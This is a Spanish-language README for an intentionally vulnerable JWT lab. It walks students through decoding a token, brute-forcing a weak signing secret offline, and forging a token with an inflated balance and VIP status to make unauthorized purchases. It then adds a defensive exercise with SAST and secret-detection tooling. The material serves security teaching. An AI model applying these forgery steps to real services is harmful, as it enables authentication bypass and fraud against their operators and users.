# Desafío JWT — Información sensible en el payload y manipulación de datos

> ⚠️ **Este código es vulnerable a propósito.** Sirve únicamente para practicar. No lo despliegues ni lo expongas a internet. Todos los usuarios y datos son ficticios.

## Objetivo

Encontrar un secreto expuesto en el cliente (en el propio JWT) y usarlo para alterar campos financieros o de identidad que nunca deberían haber estado ahí.

## Escenario

**TiendaVulnerable** es una plataforma de e-commerce simulada. Cuando un usuario inicia sesión, el servidor firma un JWT que incluye, además de la identidad, su **saldo** (`balance`) y si es **cliente VIP** (`isVip`) — datos que el servidor debería calcular y validar él mismo contra la base en cada request, no delegar al token. Para peor, la clave con la que se firma el token es débil y está hardcodeada en el código.

Usuarios ficticios (podés ver las contraseñas en `server/app/db.py`, no es parte del desafío adivinarlas):

| Usuario | Password | Saldo | VIP |
|---|---|---|---|
| `alice` | `alice123` | 100 | no |
| `bob` | `bob123` | 5000 | sí |

## Cómo levantar la app

```bash
cd server
python -m venv .venv
.venv/bin/pip install -r requirements.txt
.venv/bin/pytest -q              # corre los tests (incluyen el ataque completo)
.venv/bin/python wsgi.py         # http://localhost:5000
```

Los datos (usuarios y catálogo) viven en una base **SQLite en un archivo** (`server/data/tienda.db`, se crea sola al levantar la app por primera vez), no en memoria: persisten entre reinicios.

Endpoints:

| Ruta | Qué hace |
|---|---|
| `POST /auth/login` | `{username, password}` → `{token}` |
| `GET /me` | Perfil armado **a partir del token** (`Authorization: Bearer <token>`) |
| `GET /tienda/catalogo` | Lista pública de productos y precios |
| `POST /tienda/comprar` | `{producto}` → autoriza la compra comparando el precio contra el `balance`/`isVip` **del token** |

Páginas (para resolver el desafío desde el navegador si preferís eso a usar `curl`):

| Ruta | Qué es |
|---|---|
| `http://localhost:5000/` | Login de la tienda |
| `http://localhost:5000/productos` | Catálogo con tu saldo/VIP y botón de compra por producto |
| `http://localhost:5000/alumno-devtools` | Herramientas de inspección: token crudo, `/me` y `/tienda/comprar` a mano, y un campo para pegar un token forjado |

## La misión

> 💡 Los comandos de Python de esta sección usan el paquete `PyJWT`, que instalaste dentro del venv (`.venv/bin/pip install -r requirements.txt`). Corré esos comandos con `.venv/bin/python3` (o activá el venv antes con `source .venv/bin/activate` y usá `python3` normal) — si usás el `python3` del sistema sin activar el venv, vas a tener `ModuleNotFoundError: No module named 'jwt'`.

### Paso 1 — Inspeccionar el token

Logueate como `alice` y mirá el JWT que te devuelve el servidor, en el navegador (DevTools → Network o Application/Storage, el token queda en `localStorage`) o por terminal:

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
```

Vas a ver el payload en texto plano, con `balance` e `isVip` adentro. Recordá: **un JWT no está cifrado, solo codificado en Base64 y firmado.** Nunca hace falta (ni conviene) pegarlo en un decodificador online — decodificarlo es una operación local de una línea, como la de arriba.

### Paso 2 — Crackear el secreto, offline y en local

El secreto que firma el token es corto y está en una wordlist cualquiera (`tools/wordlist.txt`). Acá es donde entrás vos: `tools/crack_local.py` está **vacío a propósito** — es tu punto de partida, no una solución.

Tenés dos caminos, y podés combinarlos:

1. **Completar `tools/crack_local.py`**: el archivo trae, en el docstring, la idea (separar el token, recalcular HMAC-SHA256 de `header.payload` con cada palabra candidata usando `hmac`/`hashlib` de la librería estándar, y comparar con `hmac.compare_digest`).
2. **Usar cualquier herramienta que encuentres**, por ejemplo `jwt_tool` o `hashcat`, siempre que **corra en tu máquina**:

   ```bash
   jwt_tool "$TOKEN" -C -d tools/wordlist.txt
   ```

**Única condición: la herramienta tiene que ser de ejecución local.** Nada de pegar el token en un decodificador/"JWT cracker" online ni mandarlo a ningún servicio en la nube — ni siquiera para esta demo con datos ficticios. Si no sabés si una herramienta cumple esto, revisá que no abra conexión de red al correrla.

### Paso 3 — Forjar un token alterado

Con el secreto en mano, firmá tu propio token con `balance` e `isVip` a tu gusto, y usalo contra el servidor:

```bash
.venv/bin/python3 -c "
import jwt
token = jwt.encode(
    {'sub': '999', 'username': 'atacante', 'balance': 999999, 'isVip': True},
    'secret123',
    algorithm='HS256',
)
print(token)
"
```

Probalo:

```bash
FORJADO="<pegar el token de arriba>"
curl -s http://localhost:5000/me -H "Authorization: Bearer $FORJADO"
curl -s -X POST http://localhost:5000/tienda/comprar \
  -H "Content-Type: application/json" -H "Authorization: Bearer $FORJADO" \
  -d '{"producto":"notebook-gamer"}'
```

El servidor te va a dejar "comprar" un producto que `alice` jamás podría pagar, y con el descuento VIP aplicado, sin haber tocado la base de datos.

## Aprendizaje clave

- Un JWT **no es cifrado, solo firmado**: cualquiera puede leer el payload sin conocer el secreto.
- La firma solo garantiza que *si el secreto es fuerte y no se filtró*, el contenido no fue modificado — un secreto débil anula esa garantía por completo.
- Nunca hay que delegar al token lógica de negocio ni estado crítico (saldo, permisos, roles, descuentos): esos datos se recalculan en el servidor, consultando la fuente de verdad (la base), en cada request.

## Qué entregar

1. Captura del payload del JWT decodificado, mostrando `balance`/`isVip`.
2. Captura de la terminal mostrando el secreto encontrado por fuerza bruta offline (`tools/crack_local.py` o `jwt_tool`/`hashcat`).
3. Captura de la petición con el token forjado y la respuesta exitosa del servidor (`/me` y/o `/tienda/comprar`).

## Extensión — Sumá seguridad al pipeline (SAST, secret detection, análisis local)

Resuelto el ataque, la segunda parte del desafío es endurecer **este mismo repo** agregándole una capa de seguridad automatizada, tanto en tu máquina como en GitLab CI/CD.

### Qué agregar

1. **SAST + secret detection en GitLab CI/CD**: agregá (o completá) el `.gitlab-ci.yml` en la raíz de este repo


2. **El mismo análisis, en local, antes de subir**: elegí y corré al menos una herramienta por categoría contra `server/`. Todas pueden bajar reglas o bases de firmas por red (eso está permitido), pero el **código nunca se manda a ningún servicio externo** — corren contra tu copia local:

   | Categoría | Opciones | Para qué sirve |
   |---|---|---|
   | SAST | `bandit -r server/app`, o `semgrep --metrics=off --config p/security-audit --config p/python server/app` | Analiza el código fuente en busca de patrones vulnerables (inyección, crypto débil, etc.) sin ejecutarlo |
   | Detección de secretos | `gitleaks detect --source . --no-git`, `detect-secrets scan` | Busca credenciales, claves o tokens hardcodeados en el repo (como el `SECRET` de `jwt_utils.py`) |
   | Dependencias (SCA) | `pip-audit -r server/requirements.txt` | Chequea si alguna librería del `requirements.txt` tiene una CVE conocida |

   No tienen que ser exactamente estas: podés usar cualquier herramienta que encuentres, **siempre que corra en local**. Mismo criterio que en el Paso 2 del desafío del JWT.

3. **Probá que la detección de secretos funciona**: en una rama aparte, agregá una credencial **falsa** (ej. `AWS_SECRET_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"`) en un archivo, confirmá que el job `secret_detection` (o tu herramienta local) la marca, y después borrala del código. Nunca uses una credencial real para esta prueba.

### Documentar en `SAST.md`

Creá `SAST.md` en la raíz de este repo con:

- Una **captura** del pipeline de GitLab corriendo en verde, mostrando los jobs `sast` y `secret_detection`.
- Una tabla con las herramientas que terminaste usando (local y/o en el pipeline):

  | Herramienta | Para qué sirve | Por qué la elegiste |
  |---|---|---|
  | *(ej. Bandit)* | *(ej. SAST para Python: detecta uso de `eval`, hashes débiles, etc.)* | *(ej. corre sin red, config mínima, ya viene con reglas para Flask)* |

### Criterio de aceptación

- [ ] `.gitlab-ci.yml` con `include` de SAST + Secret Detection, pipeline en verde.
- [ ] Al menos una corrida local por categoría (SAST, secretos, dependencias), con su comando documentado en `SAST.md`.
- [ ] `SAST.md` con la captura del pipeline y la tabla completa (herramienta / para qué sirve / por qué la elegiste).
- [ ] Prueba de secret detection con una credencial falsa, agregada y luego borrada.

## Preguntas para pensar con criterio

Responder en un `respuestas.md` junto con las capturas:

1. ¿Por qué `balance` e `isVip` nunca deberían viajar como claims "de confianza" dentro de un JWT? ¿Qué cambiaría en el diseño si el servidor los recalculara desde la base en cada request, en vez de leerlos del token?
2. ¿Cómo mejorarías la gestión del secreto de firma (longitud, origen aleatorio, dónde se guarda, rotación)? Mirá cómo lo resuelve `clases/u2-tokens-jwt/app-sanitizada` como referencia.
3. Esa misma app (`app-sanitizada`) agrega, entre otras cosas, `exp` corto, allowlist de algoritmo, y revocación por `jti`. De esas y otras mejoras posibles (HTTPS, no guardar el token en `localStorage`, etc.), ¿cuáles priorizarías para este caso y por qué?
4. Si quisieras guardar algún dato de sesión dentro del JWT sin arriesgar nada aunque alguien lo lea o lo forje, ¿qué tipo de dato sería razonable incluir? ¿Qué lo distingue de `balance`?
